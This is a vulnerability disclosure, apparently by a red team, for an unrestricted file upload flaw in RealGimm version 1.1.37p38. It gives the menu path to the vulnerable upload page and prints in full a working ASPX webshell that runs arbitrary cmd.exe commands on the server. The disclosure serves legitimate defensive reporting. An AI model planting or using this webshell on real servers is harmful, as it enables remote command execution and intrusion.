# CVE-ID | RealGimm by GruppoSCAI - Unrestricted File Upload
An unrestricted file upload vunerability was found in RealGimm version 1.1.37p38. What follows is a description of the steps taken to perform the exploit.

## Proof of Concept
In order to reach the vulnerable webpage, select *Patrimonio* from the main menu, then *Comunicazione*, *Modelli Comunicazione* and finally click on *Ente* icon. Then, in the new screen that opens, click on the "Carica Immagine..." link.
![Path to page](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/172fd7f5-1fe4-47be-8ce0-03370c4fe774)
![Vulnerable page](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/efe1d73f-c161-4186-82e8-3a7c180f32a4)

So let's load an aspx webshell. Below the code:
```
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>
```
![ASPX file upload](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/18e8f543-f48e-47f2-bc9e-dfe735ac450d)


Below the intercepted request and response:
![Intercepted request and response](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/9a611616-49e1-46bd-9f11-762428b2acb0)

Once the file has been uploaded, select it from those available and click on the green check to add it to the email body:
![Attaching file to email](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/d58cf1ca-060e-4a07-9d7d-1fcfd87c8891)

Below the intercepted request and response used to attach the web shell to the emailâ€™s body:
![Request and response](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/b937394c-e3e0-4974-bd8a-69c0397deb9f)


As can be seen above, the malicious aspx web shell is present and available on the file system underlying the target web application, thus confirming the existence of the vulnerability.


## Vulnerable version of RealGimm

As a result of our testing, version 1.1.37p38 is considered to be affected by this vulnerability. 


## Discovered by

Paolo Caminati

Francesco Mercatili

Claudio Rimensi



